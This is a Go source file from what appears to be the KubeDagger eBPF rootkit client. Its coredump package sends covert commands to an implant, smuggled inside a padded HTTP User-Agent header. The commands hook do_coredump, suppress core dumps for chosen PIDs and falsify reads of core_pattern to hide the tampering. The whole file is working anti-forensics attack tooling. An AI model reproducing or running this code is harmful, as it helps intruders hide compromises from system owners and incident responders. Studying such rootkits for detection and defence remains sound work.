package coredump

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type SuppressResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, pids, output string) error {
	result := &SuppressResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_do_coredump",
			"kprobe on do_coredump to intercept core dump generation for target PIDs",
			"coredump_hook",
		},
		{
			"configure_pid_filter",
			"populate BPF hash map with PIDs whose core dumps should be suppressed",
			"coredump_set_pids",
		},
		{
			"suppress_signal_delivery",
			"prevent SIGABRT/SIGSEGV core dump file creation for filtered processes",
			"coredump_suppress_signal",
		},
		{
			"hide_coredump_pattern",
			"modify /proc/sys/kernel/core_pattern reads to hide evidence of suppression",
			"coredump_hide_pattern",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + pids
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/coredump_suppress", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
